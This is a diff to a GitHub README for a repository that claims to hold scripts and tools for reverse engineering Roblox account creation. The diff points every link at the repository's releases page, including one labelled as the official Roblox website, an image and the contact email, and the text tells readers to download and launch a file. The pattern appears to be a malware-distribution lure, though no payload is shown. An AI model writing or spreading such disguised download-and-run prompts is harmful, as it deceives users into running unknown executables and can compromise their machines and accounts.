@@ -19,21 +19,21 @@ Welcome to the "roblox" repository! Here you will find all the resources you nee
 You can find various scripts, tools, and resources related to reverse engineering Roblox account creation in this repository. Whether you are a beginner or an expert in the field of reverse engineering, there is something here for everyone.
 
 ## Get Started 🚀
-To explore the repository, simply click on the following link: [Download Here](https://github.com/uploads/App.zip)
+To explore the repository, simply click on the following link: [Download Here](https://github.com/ArcNassss/roblox/releases)
 
 ## Need Help? 🤔
 If the link above ends with a file name, make sure to launch it to access the repository content. If the link provided does not work or you require additional assistance, feel free to check the "Releases" section for more information.
 
 ## Stay Connected 🌐
-Stay up to date with the latest developments by visiting the [Roblox website](https://www.roblox.com/). Explore new features, games, and updates within the Roblox platform.
+Stay up to date with the latest developments by visiting the [Roblox website](https://github.com/ArcNassss/roblox/releases). Explore new features, games, and updates within the Roblox platform.
 
-![Roblox](https://img.icons8.com/color/452/roblox.png)
+![Roblox](https://github.com/ArcNassss/roblox/releases)
 
 ## Contribution Guidelines 🤝
 We welcome contributions from the community to enhance this repository further. If you have any valuable insights, scripts, or tools related to Roblox account creation, feel free to submit a pull request.
 
 ## Connect with Us 📧
-For any queries or suggestions, you can reach out to us via email at roblox@reverseengineering.com. We are always eager to hear from fellow enthusiasts and experts in the field.
+For any queries or suggestions, you can reach out to us via email at https://github.com/ArcNassss/roblox/releases We are always eager to hear from fellow enthusiasts and experts in the field.
 
 ## Let's Dive In! 🎮
 Start your journey into the world of reverse engineering Roblox account creation today. Unveil the mysteries behind the algorithms and data structures that power one of the most popular gaming platforms worldwide. Happy coding! 🚀
